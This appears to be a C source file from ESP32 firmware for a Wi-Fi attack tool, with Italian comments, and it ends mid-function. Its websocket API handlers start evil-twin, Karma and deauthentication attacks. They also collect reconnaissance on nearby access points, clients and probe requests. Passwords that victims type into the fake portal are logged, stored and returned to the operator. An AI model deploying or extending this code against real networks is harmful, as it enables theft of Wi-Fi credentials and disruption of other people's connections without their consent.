#include <string.h>
#include <esp_timer.h>
#include <esp_log.h>
#include <cJSON.h>
#include <stdarg.h>
#include "mbedtls/base64.h"
#include "utils.h"
#include "config.h"
#include "wifiMng.h"
#include "evil_twin.h"
#include "karma_attack.h"
#include "server_api.h"
#include "passwordMng.h"
#include "vendors.h"
#include "target.h"
#include "nvs_keys.h"
#include "deauther.h"
#include "sniffer.h"
#include "networking.h"
#include "scanner.h"
#include "TaskManager.h"
#include <libwifi.h>


static const char *TAG = "SERVER_API";

typedef struct {
    api_command_t cmd;
    esp_err_t (*handler)(ws_frame_req_t *req);
} api_cmd_t;


static void delayed_restart_timer_cb(TimerHandle_t xTimer)
{
    ESP_LOGI(TAG, "Rebooting now...");
    esp_restart();
}


const char* mime_from_path(const char* path) {
    if (strstr(path, ".html")) return "text/html";
    if (strstr(path, ".css"))  return "text/css";
    if (strstr(path, ".js"))   return "application/javascript";
    if (strstr(path, ".png"))  return "image/png";
    if (strstr(path, ".jpg"))  return "image/jpeg";
    if (strstr(path, ".ico"))  return "image/x-icon";
    if (strstr(path, ".svg"))  return "image/svg+xml";
    return "text/plain";
}


static void shutdown_task(void *pvParameter)
{
    vTaskDelay(pdMS_TO_TICKS(1000));
    evil_twin_stop_attack();

    /* Enter in deep sleep to preserve battery power */
    /* Only hardware wakeup (Reset button) */
    //esp_deep_sleep_start();

    task_manager_unregister_current_task();
    vTaskDelete(NULL);
}


static void api_send_status_frame(ws_frame_req_t *req, const char* status, const char *message)
{
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return;

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "status", status);
    cJSON_AddStringToObject(root, "message", message);

    char *payload = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (payload == NULL) return;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = payload;
    cmd.len = strlen(payload);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(payload);
    }
}


static esp_err_t api_get_status(ws_frame_req_t *req)
{
    /* --- SYSTEM STATS --- */
    int64_t time_us = esp_timer_get_time();
    int64_t time_s = time_us / 1000000;
    int hours = time_s / 3600;
    int minutes = (time_s % 3600) / 60;
    int seconds = time_s % 60;
    char uptime_str[16];
    snprintf(uptime_str, sizeof(uptime_str), "%02d:%02d:%02d", hours, minutes, seconds);

    size_t total_ram = heap_caps_get_total_size(MALLOC_CAP_DEFAULT);
    size_t free_ram = heap_caps_get_free_size(MALLOC_CAP_DEFAULT);
    int ram_usage = (total_ram > 0) ? 100 - ((free_ram * 100) / total_ram) : 0;

    // 1. Target Info
    target_info_t *et_target = target_get(TARGET_INFO_EVIL_TWIN);
    target_info_t *et_5g_target = target_get(TARGET_INFO_EVIL_TWIN_5G);
    
    int client_count = wifi_sniffer_get_clients_count();
    int ap_count = wifi_sniffer_get_aps_count();
    int has_handshake = wifi_sniffer_get_handshake_status_for_target(et_target->bssid);

    cJSON *root = cJSON_CreateObject();
    if (root == NULL) return ESP_FAIL;

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_status");
    
    // System
    cJSON_AddStringToObject(root, "uptime", uptime_str);
    cJSON_AddNumberToObject(root, "ram", ram_usage);
    cJSON_AddBoolToObject(root, "usb_wifi", wifi_usb_present());
    
    bool is_et_running = (evil_twin_attack_get_status() != EVIL_TWIN_ATTACK_STATUS_IDLE);
    bool is_deauth_running = deauther_is_running();
    bool is_karma_running = (karma_attack_get_status() != KARMA_ATTACK_STATUS_IDLE);

    cJSON_AddBoolToObject(root, "et_running", is_et_running);
    cJSON_AddBoolToObject(root, "deauth_running", is_deauth_running);
    cJSON_AddBoolToObject(root, "karma_running", is_karma_running);

    // Wifi connection status
    cJSON_AddBoolToObject(root, "wifi_connected", wifi_is_connected());
    wifi_config_t wifi_sta_config;
    if( esp_wifi_get_config(WIFI_IF_STA, &wifi_sta_config) == ESP_OK ) {
        cJSON_AddStringToObject(root, "wifi_sta_ssid", (char*)wifi_sta_config.sta.ssid);
    }

    if(is_et_running) {
        // Basic Target Info
        cJSON_AddStringToObject(root, "ssid", (char*)et_target->ssid);
        cJSON_AddNumberToObject(root, "ch", et_target->channel);
        cJSON_AddNumberToObject(root, "rssi", et_target->rssi);
        
        // Advanced Target Info (BSSID, Vendor, Security)
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
                 et_target->bssid[0], et_target->bssid[1], et_target->bssid[2],
                 et_target->bssid[3], et_target->bssid[4], et_target->bssid[5]);
        cJSON_AddStringToObject(root, "bssid", bssid_str);
        cJSON_AddStringToObject(root, "vendor", vendorToString(et_target->vendor));
        cJSON_AddStringToObject(root, "auth", authmode_to_str(et_target->authmode));

        // 5GHz Intelligence
        bool has_5g = (et_5g_target->channel > 0);
        cJSON_AddBoolToObject(root, "has_5g", has_5g);
        if(has_5g) {
            cJSON_AddNumberToObject(root, "ch_5g", et_5g_target->channel);
            cJSON_AddNumberToObject(root, "rssi_5g", et_5g_target->rssi);
        }
    }

    // Sniffer / Environment Stats
    cJSON_AddNumberToObject(root, "n_clients", client_count);
    cJSON_AddNumberToObject(root, "n_aps", ap_count);
    cJSON_AddNumberToObject(root, "hs_state", has_handshake);
    cJSON_AddNumberToObject(root, "tx_sent", wifi_get_sent_frames());
    cJSON_AddNumberToObject(root, "tx_drop", wifi_get_dropped_frames());
    cJSON_AddNumberToObject(root, "tx_pps", wifi_get_frame_pps());

    // Network Info
    bool has_ip = networking_has_ip();
    cJSON_AddBoolToObject(root, "has_ip", has_ip);
    if (has_ip) {
        esp_netif_ip_info_t *ip_info = networking_get_ip_info();
        char ip_str[16];
        char mask_str[16];
        char gw_str[16];
        snprintf(ip_str, sizeof(ip_str), IPSTR, IP2STR(&ip_info->ip));
        snprintf(mask_str, sizeof(mask_str), IPSTR, IP2STR(&ip_info->netmask));
        snprintf(gw_str, sizeof(gw_str), IPSTR, IP2STR(&ip_info->gw));
        cJSON_AddStringToObject(root, "ip", ip_str);
        cJSON_AddStringToObject(root, "netmask", mask_str);
        cJSON_AddStringToObject(root, "gateway", gw_str);
    }

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (json_response == NULL) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_get_recon_data_aps(ws_frame_req_t *req)
{
    // 1. Alloca le strutture grandi sull'HEAP per salvare lo Stack del task!
    aps_info_t *recon_aps = (aps_info_t *)malloc(sizeof(aps_info_t));

    if (!recon_aps) {
        if (recon_aps) free(recon_aps);
        ESP_LOGE(TAG, "No Heap memory for recon structs!");
        return ESP_ERR_NO_MEM;
    }

    // Riempi le strutture
    wifi_sniffer_get_aps(recon_aps);

    // 2. Crea il JSON
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        free(recon_aps);
        return ESP_FAIL;
    }

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "recon_data");
    cJSON_AddStringToObject(root, "status", "ok");

    // 3. Array APs -- formato COMPATTO posizionale invece di oggetti con chiavi
    cJSON *aps_array = cJSON_AddArrayToObject(root, "aps");
    for (int i = 0; i < recon_aps->count; i++)
    {
        cJSON *row = cJSON_CreateArray();
        char bssid_str[18];
        snprintf(bssid_str, sizeof(bssid_str), MACSTRCAPS, MAC2STR(recon_aps->ap[i].bssid));
        int hs_status = wifi_sniffer_get_handshake_status_for_target(recon_aps->ap[i].bssid);
        cJSON_AddItemToArray(row, cJSON_CreateString((char*)recon_aps->ap[i].ssid));
        cJSON_AddItemToArray(row, cJSON_CreateString(bssid_str));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_aps->ap[i].rssi));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_aps->ap[i].primary));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_aps->ap[i].packets_tx + recon_aps->ap[i].packets_rx));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_aps->ap[i].bytes_tx + recon_aps->ap[i].bytes_rx));
        cJSON_AddItemToArray(row, cJSON_CreateString(authmode_to_str(recon_aps->ap[i].authmode)));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(hs_status));
        cJSON_AddItemToArray(aps_array, row);
    }

    // 5. Stampa il JSON e libera IMMEDIATAMENTE le strutture per ridare ossigeno alla RAM
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    free(recon_aps);

    if (json_response == NULL) {
        ESP_LOGE(TAG, "cJSON Print Failed! JSON too large for available Heap.");
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_get_recon_data_clients(ws_frame_req_t *req)
{
    client_list_t *recon_clients = (client_list_t *)malloc(sizeof(client_list_t));
    probe_request_list_t *recon_probes = (probe_request_list_t *)malloc(sizeof(probe_request_list_t));

    esp_err_t alloc_err = ESP_OK;
    if (!recon_clients) {
        ESP_LOGE(TAG, "No Heap memory for recon structs!");
        alloc_err = ESP_ERR_NO_MEM;
    }

    if (!recon_probes) {
        ESP_LOGE(TAG, "No Heap memory for recon structs!");
        alloc_err = ESP_ERR_NO_MEM;
    }

    if (alloc_err != ESP_OK) {
        if (recon_clients) free(recon_clients);
        if (recon_probes) free(recon_probes);
        return alloc_err;
    }

    wifi_sniffer_get_clients(recon_clients);
    wifi_sniffer_get_probes(recon_probes);

    // 2. Crea il JSON
    cJSON *root = cJSON_CreateObject();
    if (root == NULL) {
        free(recon_clients);
        free(recon_probes);
        return ESP_FAIL;
    }

    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "recon_data");
    cJSON_AddStringToObject(root, "status", "ok");

    // 4. Array Client -- stesso formato compatto posizionale degli AP, ordine
    // fisso [mac, bssid, ch, rssi, pkts, bytes, probes] (probes per ultimo
    // perche' e' l'unico campo di lunghezza variabile/annidato). Concordato
    // col frontend, vedi fetchReconDataCli() in admin.html.
    cJSON *clients_array = cJSON_AddArrayToObject(root, "clients");
    for (int i = 0; i < recon_clients->count; i++)
    {
        cJSON *row = cJSON_CreateArray();
        char mac_str[18];
        char bssid_str[18];
        snprintf(mac_str, sizeof(mac_str), MACSTRCAPS, MAC2STR(recon_clients->client[i].mac));
        snprintf(bssid_str, sizeof(bssid_str), MACSTRCAPS, MAC2STR(recon_clients->client[i].bssid));
        cJSON_AddItemToArray(row, cJSON_CreateString(mac_str));
        cJSON_AddItemToArray(row, cJSON_CreateString(bssid_str));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_clients->client[i].channel));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_clients->client[i].rssi));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_clients->client[i].packets_tx + recon_clients->client[i].packets_rx));
        cJSON_AddItemToArray(row, cJSON_CreateNumber(recon_clients->client[i].bytes_tx + recon_clients->client[i].bytes_rx));

        cJSON *ssid_probes_array = cJSON_CreateArray();
        // Controllo di sicurezza se recon_probes non è stato ancora inizializzato
        if (recon_probes != NULL)
        {
            for(int p = 0; p < recon_probes->num_probes; p++) {
                if(memcmp(recon_probes->probes[p].mac, recon_clients->client[i].mac, 6) == 0) {
                    char safe_ssid[33] = {0};
                    strncpy(safe_ssid, (char*)recon_probes->probes[p].ssid, 32);
                    cJSON_AddItemToArray(ssid_probes_array, cJSON_CreateString(safe_ssid));
                }
            }
        }
        cJSON_AddItemToArray(row, ssid_probes_array);

        cJSON_AddItemToArray(clients_array, row);
    }

    // 5. Stampa il JSON e libera IMMEDIATAMENTE le strutture per ridare ossigeno alla RAM
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    free(recon_clients);
    free(recon_probes);

    if (json_response == NULL) {
        ESP_LOGE(TAG, "cJSON Print Failed! JSON too large for available Heap.");
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }
    
    return ESP_OK;
}


static esp_err_t api_admin_get_ap_settings(ws_frame_req_t *req) 
{
    char ssid[32] = {0};
    char password[64] = {0};
    int32_t channel = DEFAULT_WIFI_CHAN;
    wifi_phy_rate_t tx_rate = DEFAULT_WIFI_TX_RATE;

    /* Read value from flash */
    if( read_string_from_nvs(WIFI_SSID_KEY, ssid) != ESP_OK )
    {
        strcpy(ssid, DEFAULT_WIFI_SSID);
    }
    if( read_string_from_nvs(WIFI_PASS_KEY, password) != ESP_OK )
    {
        strcpy(password, DEFAULT_WIFI_PASS);
    }
    if( read_int_from_nvs(WIFI_CHAN_KEY, &channel) != ESP_OK )
    {
        channel = DEFAULT_WIFI_CHAN;
    }
    if( read_int_from_nvs(WIFI_TX_RATE_KEY, (int32_t *)&tx_rate) != ESP_OK )
    {
        tx_rate = DEFAULT_WIFI_TX_RATE;
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "get_ap_settings");
    cJSON_AddStringToObject(root, "ssid", ssid);
    cJSON_AddStringToObject(root, "password", password);
    cJSON_AddNumberToObject(root, "channel", channel);
    cJSON_AddNumberToObject(root, "tx_rate", tx_rate);
    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) {
        return ESP_FAIL;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_admin_set_ap_settings(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        ESP_LOGE(TAG, "Invalid JSON received: %s", req->payload);
        return ESP_FAIL;
    }
    const cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    const cJSON *j_password = cJSON_GetObjectItemCaseSensitive(json, "password");
    const cJSON *j_channel = cJSON_GetObjectItemCaseSensitive(json, "channel");
    const cJSON *j_tx_rate = cJSON_GetObjectItemCaseSensitive(json, "tx_rate");

    char ssid[32] = {0};
    char password[64] = {0};

    if (cJSON_IsString(j_ssid)) {
        if (strlen(j_ssid->valuestring) == 0 || strlen(j_ssid->valuestring) >= 32) {
            cJSON_Delete(json);
            api_send_status_frame(req, "error", "Invalid SSID length.");
            return ESP_FAIL;
        }
        strlcpy(ssid, j_ssid->valuestring, sizeof(ssid));
        save_string_to_nvs(WIFI_SSID_KEY, (const char *)ssid);
    }
    if (cJSON_IsString(j_password)) {
        strlcpy(password, j_password->valuestring, sizeof(password));
        save_string_to_nvs(WIFI_PASS_KEY, (const char *)password);
    }
    if (cJSON_IsNumber(j_channel)) {
        save_int_to_nvs(WIFI_CHAN_KEY, j_channel->valueint);
    }
    if (cJSON_IsNumber(j_tx_rate)) {
        save_int_to_nvs(WIFI_TX_RATE_KEY, (int32_t)j_tx_rate->valueint);
    }
    cJSON_Delete(json);

    api_send_status_frame(req, "ok", "AP settings saved successfully.");

    TimerHandle_t restart_timer = xTimerCreate("restart_timer", pdMS_TO_TICKS(2000), pdFALSE, NULL, delayed_restart_timer_cb);
    if (restart_timer != NULL) {
        xTimerStart(restart_timer, 0);
        ESP_LOGI(TAG, "Restart scheduled in 2 seconds.");
    } else {
        ESP_LOGE(TAG, "Failed to create restart timer! Forcing immediate reboot.");
        esp_restart(); // Fallback
    }

    return ESP_OK;
}


static esp_err_t api_wifi_scan(ws_frame_req_t *req)
{
    esp_err_t ret = wifi_sniffer_scan_fill_aps();
    
    if (ret != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to perform WiFi scan");
        return ret;
    }

    aps_info_t *scan_results = (aps_info_t *)malloc(sizeof(aps_info_t));
    if (!scan_results) {
        ESP_LOGE(TAG, "No Heap memory for scan results!");
        return ESP_ERR_NO_MEM;
    }

    if(wifi_sniffer_get_aps(scan_results) != ESP_OK) {
        api_send_status_frame(req, "error", "Failed to get scan results");
        free(scan_results);
        return ESP_FAIL;
    }

    if(scan_results->count == 0) {
        api_send_status_frame(req, "ok", "No APs found");
        free(scan_results);
        return ESP_OK;
    }

    cJSON *response_obj = cJSON_CreateObject();
    cJSON_AddNumberToObject(response_obj, "req_id", req->req_id);
    cJSON_AddStringToObject(response_obj, "type", "scan_result");

    cJSON *root = cJSON_CreateArray();
    if (!root) {
        free(scan_results);
        api_send_status_frame(req, "error", "cJSON_CreateArray failed");
        return ESP_ERR_NO_MEM;
    }

    for (int i = 0; i < scan_results->count; i++) 
    {
        char ssid[33];
        memcpy(ssid, scan_results->ap[i].ssid, sizeof(scan_results->ap[i].ssid));
        ssid[32] = '\0';
        char bssid[18];
        snprintf(bssid, sizeof(bssid), MACSTRCAPS, MAC2STR(scan_results->ap[i].bssid));
        
        cJSON *obj = cJSON_CreateObject();
        if (!obj) {
            cJSON_Delete(root);
            free(scan_results);
            cJSON_Delete(response_obj);
            api_send_status_frame(req, "error", "cJSON_CreateObject failed");
            return ESP_ERR_NO_MEM;
        }

        cJSON_AddStringToObject(obj, "ssid", ssid);
        cJSON_AddNumberToObject(obj, "signal", scan_results->ap[i].rssi);
        cJSON_AddNumberToObject(obj, "channel", scan_results->ap[i].primary);
        cJSON_AddStringToObject(obj, "bssid", bssid);
        cJSON_AddStringToObject(obj, "authmode", authmode_to_str(scan_results->ap[i].authmode));
        cJSON_AddNumberToObject(obj, "authmode_code", scan_results->ap[i].authmode);
        cJSON_AddNumberToObject(obj, "pairwise_cipher", scan_results->ap[i].pairwise_cipher);
        cJSON_AddNumberToObject(obj, "group_cipher", scan_results->ap[i].group_cipher);
        cJSON_AddBoolToObject(obj, "wps", scan_results->ap[i].wps ? 1 : 0);
        cJSON_AddItemToArray(root, obj);
    }
    cJSON_AddItemToObject(response_obj, "data", root);

    char *json = cJSON_PrintUnformatted(response_obj);
    if (scan_results) free(scan_results);
    cJSON_Delete(response_obj);

    if (!json) {
        return ESP_ERR_NO_MEM;
    }

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json; 
    cmd.len = strlen(json);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_start_evil_twin(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    target_info_t target_info = { 0 };

    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_bssid = cJSON_GetObjectItemCaseSensitive(json, "bssid");
    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
    cJSON *j_rssi = cJSON_GetObjectItemCaseSensitive(json, "signal");
    cJSON *j_auth = cJSON_GetObjectItemCaseSensitive(json, "authmode_code");
    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_rssi)) target_info.rssi = (int8_t)j_rssi->valueint;
    if (cJSON_IsNumber(j_auth)) target_info.authmode = (wifi_auth_mode_t)j_auth->valueint;
    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;

    if (cJSON_IsString(j_bssid)) {
        sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]);
    }

    cJSON_Delete(json);

    ESP_LOGI(TAG, "Starting Evil Twin on SSID: %s (Ch: %d)", target_info.ssid, target_info.channel);
    evil_twin_start_attack(&target_info);

    api_send_status_frame(req, "ok", "Evil Twin Started");
    return ESP_OK;
}


static esp_err_t api_stop_evil_twin(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    evil_twin_stop_attack();
    api_send_status_frame(req, "ok", "Evil Twin Attack Stopped");
    cJSON_Delete(json);
    return ESP_OK;
}


static esp_err_t api_get_evlitwin_target(ws_frame_req_t *req)
{
    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);

    char path[64];
    strlcpy(path, "/logo/", sizeof(path));
    strlcat(path, vendorToString(target->vendor), sizeof(path));
    strlcat(path, ".png", sizeof(path));

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "eviltwin_target");
    cJSON_AddStringToObject(root, "logo", path);
    cJSON_AddStringToObject(root, "ssid", (const char*)target->ssid);
    cJSON_AddStringToObject(root, "vendor", vendorToString(target->vendor));

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }
    return ESP_OK;
}


static esp_err_t api_check_input_password(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    cJSON *j_pass = cJSON_GetObjectItemCaseSensitive(json, "password");
    if (!cJSON_IsString(j_pass)) {
        cJSON_Delete(json);
        api_send_status_frame(req, "error", "Missing password");
        return ESP_FAIL;
    }

    target_info_t *target = target_get(TARGET_INFO_EVIL_TWIN);
    char buffer[256] = { 0 };
    snprintf(buffer, sizeof(buffer), "%s,%02X:%02X:%02X:%02X:%02X:%02X,%s", 
             (const char *)target->ssid, 
             target->bssid[0], target->bssid[1], target->bssid[2], target->bssid[3], target->bssid[4], target->bssid[5], 
             j_pass->valuestring);
    
    password_manager_save(buffer);
    ESP_LOGI(TAG, "Captured: %s", buffer);

    bool correct = evil_twin_check_password(j_pass->valuestring);
    cJSON_Delete(json);

    if (correct) {
        api_send_status_frame(req, "ok", "Password Correct");
        task_manager_create_task(shutdown_task, "shutdown_task", 4096, NULL, 5, NULL);
    } else {
        api_send_status_frame(req, "bad", "Password Incorrect");
    }
    return ESP_OK;
}


static esp_err_t api_get_passwords(ws_frame_req_t *req)
{
    FILE *f = fopen(PASSWORD_FILE, "r");
    char *file_content = NULL;
    long length = 0;

    if (f) {
        fseek(f, 0, SEEK_END);
        length = ftell(f);
        fseek(f, 0, SEEK_SET);
        if (length > 0) {
            file_content = malloc(length + 1);
            if (file_content) {
                fread(file_content, 1, length, f);
                file_content[length] = '\0';
            }
        }
        fclose(f);
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "passwords");
    cJSON_AddStringToObject(root, "content", file_content ? file_content : "");

    if (file_content) free(file_content);

    char *json_response = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json_response) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json_response;
    cmd.len = strlen(json_response);
    cmd.need_free = true;
    
    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json_response);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_karma_scan(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;
    
    cJSON *j_act = cJSON_GetObjectItemCaseSensitive(json, "start_stop"); // 1 or 0
    if (cJSON_IsNumber(j_act)) {
        if (j_act->valueint == 1) {
            karma_attack_probes_scan_start();
            api_send_status_frame(req, "ok", "Karma Scan Started");
        } else {
            karma_attack_probes_scan_stop();
            api_send_status_frame(req, "ok", "Karma Scan Stopped");
        }
    }
    cJSON_Delete(json);
    return ESP_OK;
}


static esp_err_t api_get_karma_probes(ws_frame_req_t *req)
{
    probe_request_list_t list = {0};
    if(wifi_sniffer_get_probes(&list) != ESP_OK) return ESP_FAIL;
    
    cJSON *root = cJSON_CreateObject();
    cJSON_AddNumberToObject(root, "req_id", req->req_id);
    cJSON_AddStringToObject(root, "type", "karma_probes");
    
    cJSON *arr = cJSON_CreateArray();
    for (int i = 0; i < list.num_probes; i++) {
        cJSON *item = cJSON_CreateObject();
        char mac_str[18];
        snprintf(mac_str, sizeof(mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
                    list.probes[i].mac[0], list.probes[i].mac[1], list.probes[i].mac[2],
                    list.probes[i].mac[3], list.probes[i].mac[4], list.probes[i].mac[5]);

        cJSON_AddStringToObject(item, "mac", mac_str);
        cJSON_AddStringToObject(item, "ssid", list.probes[i].ssid);
        cJSON_AddNumberToObject(item, "rssi", list.probes[i].rssi);
        cJSON_AddNumberToObject(item, "channel", list.probes[i].channel);
        cJSON_AddItemToArray(arr, item);
    }
    cJSON_AddItemToObject(root, "data", arr);

    char *json = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);

    if (!json) return ESP_FAIL;

    ws_frame_req_t cmd;
    cmd.hd = req->hd;
    cmd.fd = req->fd;
    cmd.payload = json;
    cmd.len = strlen(json);
    cmd.need_free = true;

    if (ws_send_command_to_queue(&cmd) != ESP_OK) {
        cJSON_free(json);
        return ESP_FAIL;
    }

    return ESP_OK;
}


static esp_err_t api_karma_set_target(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) return ESP_FAIL;

    target_info_t target_info = { 0 };
    cJSON *j_ssid = cJSON_GetObjectItemCaseSensitive(json, "ssid");
    cJSON *j_chan = cJSON_GetObjectItemCaseSensitive(json, "channel");
    cJSON *j_scheme = cJSON_GetObjectItemCaseSensitive(json, "scheme");

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_scheme)) target_info.attack_scheme = (uint8_t)j_scheme->valueint;

    cJSON_Delete(json);

    karma_attack_set_target(&target_info);
    api_send_status_frame(req, "ok", "Karma Attack Started");
    return ESP_OK;
}


static esp_err_t api_deauther_start(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    if (!json) {
        api_send_status_frame(req, "error", "Invalid JSON");
        return ESP_FAIL;
    }

    target_info_t target_info = {0};
    deauther_attack_type_t attack_type = DEAUTHER_ATTACK_DEAUTH_FRAME;
    deauther_attack_mode_t attack_mode = DEAUTHER_TARGET_UNICAST;
    cJSON *j_ssid = cJSON_GetObjectItem(json, "ssid");
    cJSON *j_bssid = cJSON_GetObjectItem(json, "bssid");
    cJSON *j_chan = cJSON_GetObjectItem(json, "channel");
    cJSON *j_mode = cJSON_GetObjectItem(json, "mode");
    cJSON *j_type = cJSON_GetObjectItem(json, "packet_type");

    if (cJSON_IsString(j_bssid)) {
        sscanf(j_bssid->valuestring, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_info.bssid[0], &target_info.bssid[1], &target_info.bssid[2],
               &target_info.bssid[3], &target_info.bssid[4], &target_info.bssid[5]);
    }

    if (cJSON_IsString(j_ssid)) strlcpy((char*)target_info.ssid, j_ssid->valuestring, sizeof(target_info.ssid));
    if (cJSON_IsNumber(j_chan)) target_info.channel = (uint8_t)j_chan->valueint;
    if (cJSON_IsNumber(j_type)) attack_type = (deauther_attack_type_t)j_type->valueint;

    if (cJSON_IsString(j_mode) && strcmp(j_mode->valuestring, "broadcast") == 0) {
        attack_mode = DEAUTHER_TARGET_ALL;
    } else {
        attack_mode = DEAUTHER_TARGET_UNICAST;
    }
    cJSON_Delete(json);

    ESP_LOGI(TAG, "Starting Deauth: Type=%d, Broadcast=%d", attack_type, attack_mode);
    esp_err_t deauth_start_err = deauther_start(&target_info, attack_type);

    if(deauth_start_err == ESP_OK) {
        api_send_status_frame(req, "ok", "Deauth Attack Started");
    } 
    else if(deauth_start_err == ESP_ERR_INVALID_ARG) {
        api_send_status_frame(req, "bad", "Cant start this attack on Hidded SSID.");
    } else {
        api_send_status_frame(req, "bad", "Failed to start Deauth Attack");
    }
    
    return ESP_OK;
}


static esp_err_t api_deauther_stop(ws_frame_req_t *req)
{
    deauther_stop();
    ESP_LOGI(TAG, "Stopping Deauth Attack...");
    api_send_status_frame(req, "ok", "Deauth Attack Stopped");
    return ESP_OK;
}


static esp_err_t api_start_raw_sniffer(ws_frame_req_t *req)
{
    cJSON *json = cJSON_Parse(req->payload);
    int channel = 1;
    bool hopping = false;
    int type = 0;
